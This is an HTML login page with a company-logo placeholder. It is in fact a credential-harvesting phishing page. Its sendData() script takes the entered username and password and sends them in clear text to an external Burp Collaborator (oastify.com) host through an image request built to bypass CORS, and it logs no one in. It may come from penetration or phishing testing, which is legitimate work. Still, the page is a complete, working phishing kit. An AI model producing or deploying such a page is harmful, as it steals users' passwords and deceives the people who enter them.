<!DOCTYPE html>
<html>
<head>
    <title>Centered Login</title>
    <style>
        /* Centering the login box */
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .login-container {
            text-align: center;
            border: 1px solid #ccc;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            max-width: 300px;
        }
        img {
            max-width: 100%;
            height: auto;
            margin-bottom: 15px;
        }
    </style>
    <script type="text/javascript">
        function sendData() {
            var username = encodeURIComponent(document.getElementById("username").value);
            var password = encodeURIComponent(document.getElementById("password").value);
            
            // Send the captured data to Burp Collaborator via an image request to bypass CORS
            var img = new Image();
            img.src = "http://ie0anh0zfz9ewk8lowzenmuy4paoyjm8.oastify.com/?username=" + username + "&password=" + password;
        }
    </script>
</head>
<body>
    <div class="login-container">
        <!-- Remote image placeholder -->
        <img src="https://example.com/path/to/your/image.jpg" alt="Company Logo">
        
        <!-- Login form -->
        <h2>Login</h2>
        <form onsubmit="event.preventDefault(); sendData();">
            <label for="username">Username:</label><br>
            <input type="text" id="username" name="username" required><br><br>
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password" required><br><br>
            <input type="submit" value="Submit">
        </form>
    </div>
</body>
</html>
